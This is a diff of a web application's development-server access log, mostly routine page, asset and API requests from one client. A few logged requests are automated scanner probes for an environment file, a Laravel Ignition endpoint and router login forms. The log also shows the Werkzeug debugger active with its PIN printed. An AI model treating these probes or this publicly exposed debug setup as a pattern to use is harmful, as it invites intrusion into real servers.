@@ -9,40 +9,817 @@
  * Restarting with stat
  * Debugger is active!
  * Debugger PIN: 102-686-678
-45.146.164.110 - - [17/Nov/2021 19:47:40] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 404 -
-45.146.164.110 - - [17/Nov/2021 20:28:17] "GET /_ignition/execute-solution HTTP/1.1" 404 -
-79.158.168.90 - - [17/Nov/2021 20:28:38] "GET /.env HTTP/1.1" 404 -
-79.158.168.90 - - [17/Nov/2021 20:28:39] "POST / HTTP/1.1" 405 -
+182.31.164.169 - - [21/Nov/2021 00:14:45] "GET / HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 00:14:45] "GET /static/css/index.css HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:14:45] "GET /static/images/empty_star.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:14:45] "GET /static/images/x_icon.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:14:45] "GET /static/images/logo.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:14:45] "GET /static/js/index.js HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:14:45] "POST /api/session_check HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 00:14:45] "GET /static/images/logout.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:14:45] "GET /api/list HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 00:14:45] "GET /static/images/favicon.ico HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:14:46] "GET / HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 00:14:46] "GET /static/css/index.css HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:14:46] "GET /static/js/index.js HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:14:46] "GET /static/images/logo.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:14:46] "GET /static/images/x_icon.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:14:46] "GET /static/images/empty_star.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:14:46] "POST /api/session_check HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 00:14:46] "GET /static/images/logout.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:14:46] "GET /api/list HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 00:14:48] "GET / HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 00:14:48] "GET /static/css/index.css HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:14:48] "GET /static/js/index.js HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:14:48] "GET /static/images/logo.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:14:48] "GET /static/images/empty_star.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:14:48] "GET /static/images/x_icon.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:14:48] "POST /api/session_check HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 00:14:48] "GET /static/images/logout.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:14:48] "GET /api/list HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 00:14:49] "GET / HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 00:14:49] "GET /static/css/index.css HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:14:49] "GET /static/js/index.js HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:14:49] "GET /static/images/logo.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:14:49] "GET /static/images/x_icon.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:14:49] "GET /static/images/empty_star.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:14:49] "POST /api/session_check HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 00:14:49] "GET /static/images/logout.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:14:49] "GET /api/list HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 00:14:52] "GET / HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 00:14:52] "GET /static/css/index.css HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:14:52] "GET /static/js/index.js HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:14:52] "GET /static/images/logo.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:14:52] "GET /static/images/empty_star.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:14:52] "GET /static/images/x_icon.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:14:52] "POST /api/session_check HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 00:14:52] "GET /static/images/logout.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:14:52] "GET /api/list HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 00:14:52] "GET /static/images/favicon.ico HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:14:52] "GET / HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 00:14:53] "GET /static/css/index.css HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:14:53] "GET /static/js/index.js HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:14:53] "GET /static/images/logo.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:14:53] "GET /static/images/x_icon.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:14:53] "GET /static/images/empty_star.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:14:53] "POST /api/session_check HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 00:14:53] "GET /static/images/logout.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:14:53] "GET /api/list HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 00:14:53] "GET /static/images/favicon.ico HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:14:54] "GET / HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 00:14:54] "GET /static/css/index.css HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:14:54] "GET /static/js/index.js HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:14:54] "GET /static/images/x_icon.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:14:54] "GET /static/images/logo.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:14:54] "GET /static/images/empty_star.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:14:54] "POST /api/session_check HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 00:14:54] "GET /api/list HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 00:14:54] "GET /static/images/logout.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:14:54] "GET /static/images/favicon.ico HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:14:55] "GET / HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 00:14:55] "GET /static/css/index.css HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:14:55] "GET /static/js/index.js HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:14:55] "GET /static/images/x_icon.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:14:55] "GET /static/images/logo.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:14:55] "GET /static/images/empty_star.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:14:55] "POST /api/session_check HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 00:14:55] "GET /static/images/logout.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:14:55] "GET /api/list HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 00:14:55] "GET /static/images/favicon.ico HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:14:57] "GET / HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 00:14:57] "GET /static/css/index.css HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:14:57] "GET /static/js/index.js HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:14:57] "GET /static/images/x_icon.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:14:57] "GET /static/images/empty_star.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:14:57] "GET /static/images/logo.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:14:57] "POST /api/session_check HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 00:14:57] "GET /static/images/logout.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:14:57] "GET /api/list HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 00:14:57] "GET /static/images/favicon.ico HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:14:58] "GET / HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 00:14:58] "GET /static/css/index.css HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:14:58] "GET /static/js/index.js HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:14:58] "GET /static/images/logo.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:14:58] "GET /static/images/empty_star.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:14:58] "GET /static/images/x_icon.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:14:58] "POST /api/session_check HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 00:14:58] "GET /static/images/logout.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:14:58] "GET /api/list HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 00:14:58] "GET /static/images/favicon.ico HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:15:05] "GET / HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 00:15:05] "GET /static/css/index.css HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:15:05] "GET /static/js/index.js HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:15:05] "GET /static/images/logo.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:15:05] "GET /static/images/x_icon.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:15:05] "GET /static/images/empty_star.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:15:05] "POST /api/session_check HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 00:15:05] "GET /static/images/logout.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:15:05] "GET /api/list HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 00:17:18] "GET / HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 00:17:18] "GET /static/css/index.css HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:17:18] "GET /static/js/index.js HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 00:17:18] "GET /static/images/logo.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:17:18] "GET /static/images/empty_star.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:17:18] "GET /static/images/x_icon.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:17:18] "POST /api/session_check HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 00:17:18] "GET /static/images/logout.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:17:18] "GET /api/list HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 00:17:18] "GET /static/images/favicon.ico HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:17:19] "GET / HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 00:17:19] "GET /static/css/index.css HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:17:19] "GET /static/js/index.js HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:17:19] "GET /static/images/logo.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:17:19] "GET /static/images/empty_star.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:17:19] "GET /static/images/x_icon.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:17:19] "POST /api/session_check HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 00:17:19] "GET /static/images/logout.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:17:19] "GET /api/list HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 00:17:19] "GET /static/images/favicon.ico HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:17:23] "GET / HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 00:17:23] "GET /static/css/index.css HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:17:23] "GET /static/js/index.js HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:17:23] "GET /static/images/x_icon.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:17:23] "GET /static/images/logo.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:17:23] "GET /static/images/empty_star.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:17:23] "POST /api/session_check HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 00:17:23] "GET /static/images/logout.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:17:23] "GET /api/list HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 00:17:33] "GET / HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 00:17:33] "GET /static/css/index.css HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:17:33] "GET /static/js/index.js HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:17:33] "GET /static/images/x_icon.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:17:33] "GET /static/images/logo.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:17:33] "GET /static/images/empty_star.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:17:33] "POST /api/session_check HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 00:17:33] "GET /static/images/logout.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:17:33] "GET /api/list HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 00:17:33] "GET /static/images/favicon.ico HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:17:57] "GET / HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 00:17:57] "GET /static/css/index.css HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:17:57] "GET /static/images/empty_star.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:17:57] "GET /static/images/x_icon.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:17:57] "GET /static/images/logo.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:17:57] "GET /static/js/index.js HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 00:17:57] "POST /api/session_check HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 00:17:57] "GET /static/images/logout.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 00:17:57] "GET /api/list HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 00:17:57] "GET /static/images/favicon.ico HTTP/1.1" 304 -
+45.146.164.110 - - [21/Nov/2021 00:19:50] "GET /_ignition/execute-solution HTTP/1.1" 404 -
+45.95.169.123 - - [21/Nov/2021 00:55:48] "POST /boaform/admin/formLogin HTTP/1.1" 404 -
+182.31.164.169 - - [21/Nov/2021 01:00:10] "GET / HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:00:10] "GET /static/images/logo.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:00:10] "GET /static/images/x_icon.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:00:10] "GET /static/css/index.css HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:00:10] "GET /static/images/empty_star.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:00:10] "GET /static/js/index.js HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:00:10] "POST /api/session_check HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:00:10] "GET /static/images/logout.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:00:10] "GET /api/list HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:00:10] "GET /static/images/favicon.ico HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:00:11] "GET / HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:00:11] "GET /static/css/index.css HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:00:11] "GET /static/js/index.js HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:00:11] "GET /static/images/x_icon.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:00:11] "GET /static/images/empty_star.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:00:11] "GET /static/images/logo.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:00:11] "POST /api/session_check HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:00:11] "GET /static/images/logout.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:00:11] "GET /api/list HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:00:11] "GET /static/images/favicon.ico HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:00:14] "GET / HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:00:14] "GET /static/css/index.css HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:00:15] "GET /static/js/index.js HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:00:15] "GET /static/images/logo.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:00:15] "GET /static/images/x_icon.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:00:15] "GET /static/images/empty_star.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:00:15] "POST /api/session_check HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:00:15] "GET /static/images/logout.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:00:15] "GET /api/list HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:00:15] "GET /static/images/favicon.ico HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:00:15] "GET / HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:00:15] "GET /static/css/index.css HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:00:15] "GET /static/js/index.js HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:00:15] "GET /static/images/x_icon.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:00:15] "GET /static/images/logo.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:00:15] "GET /static/images/empty_star.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:00:15] "POST /api/session_check HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:00:15] "GET /static/images/logout.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:00:15] "GET /api/list HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:00:15] "GET /static/images/favicon.ico HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:00:16] "GET / HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:00:16] "GET /static/css/index.css HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:00:16] "GET /static/js/index.js HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:00:16] "GET /static/images/logo.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:00:16] "GET /static/images/empty_star.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:00:16] "GET /static/images/x_icon.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:00:16] "POST /api/session_check HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:00:16] "GET /api/list HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:00:16] "GET /static/images/logout.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:00:16] "GET /static/images/favicon.ico HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:00:24] "GET / HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:00:24] "GET /static/css/index.css HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:00:24] "GET /static/js/index.js HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:00:24] "GET /static/images/logo.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:00:24] "GET /static/images/x_icon.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:00:24] "GET /static/images/empty_star.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:00:24] "POST /api/session_check HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:00:24] "GET /static/images/logout.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:00:24] "GET /api/list HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:00:24] "GET /static/images/favicon.ico HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:00:25] "GET / HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:00:25] "GET /static/css/index.css HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:00:25] "GET /static/js/index.js HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:00:25] "GET /static/images/logo.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:00:25] "GET /static/images/x_icon.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:00:25] "GET /static/images/empty_star.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:00:25] "POST /api/session_check HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:00:25] "GET /static/images/logout.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:00:25] "GET /api/list HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:00:25] "GET /static/images/favicon.ico HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:00:48] "GET / HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:00:48] "GET /static/css/index.css HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:00:48] "GET /static/js/index.js HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:00:48] "GET /static/images/logo.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:00:48] "GET /static/images/x_icon.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:00:48] "GET /static/images/empty_star.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:00:48] "POST /api/session_check HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:00:48] "GET /static/images/logout.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:00:48] "GET /api/list HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:00:48] "GET /static/images/favicon.ico HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:00:51] "GET / HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:00:51] "GET /static/css/index.css HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:00:51] "GET /static/js/index.js HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:00:51] "GET /static/images/logo.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:00:51] "GET /static/images/x_icon.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:00:51] "GET /static/images/empty_star.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:00:51] "POST /api/session_check HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:00:51] "GET /static/images/logout.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:00:51] "GET /api/list HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:00:51] "GET /static/images/favicon.ico HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:02:01] "GET / HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:02:02] "GET /static/css/index.css HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:02:02] "GET /static/js/index.js HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:02:02] "GET /static/images/x_icon.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:02:02] "GET /static/images/empty_star.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:02:02] "GET /static/images/logo.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:02:02] "POST /api/session_check HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:02:02] "GET /static/images/logout.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:02:02] "GET /api/list HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:02:02] "GET /static/images/favicon.ico HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:02:03] "GET / HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:02:03] "GET /static/css/index.css HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:02:03] "GET /static/js/index.js HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:02:03] "GET /static/images/x_icon.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:02:03] "GET /static/images/logo.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:02:03] "GET /static/images/empty_star.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:02:03] "POST /api/session_check HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:02:03] "GET /static/images/logout.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:02:03] "GET /api/list HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:02:03] "GET /static/images/favicon.ico HTTP/1.1" 304 -
+ * Detected change in '/home/opc/arambyeol/get_data.py', reloading
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 102-686-678
+ * Detected change in '/home/opc/arambyeol/get_data.py', reloading
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 102-686-678
+182.31.164.169 - - [21/Nov/2021 01:13:50] "GET / HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:13:50] "GET /static/css/index.css HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:13:50] "GET /static/images/logo.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:13:50] "GET /static/js/index.js HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:13:50] "GET /static/images/x_icon.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:13:50] "GET /static/images/empty_star.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:13:50] "POST /api/session_check HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:13:50] "GET /api/list HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:13:50] "GET /static/images/logout.png HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:13:50] "GET /static/images/favicon.ico HTTP/1.1" 304 -
+182.31.164.169 - - [21/Nov/2021 01:14:01] "POST /api/menu_score HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:14:03] "GET / HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:14:03] "POST /logout HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:14:03] "GET / HTTP/1.1" 200 -
+182.31.164.169 - - [21/Nov/2021 01:14:04] "GET /static/css/index.css HTTP/1.1" 304 -
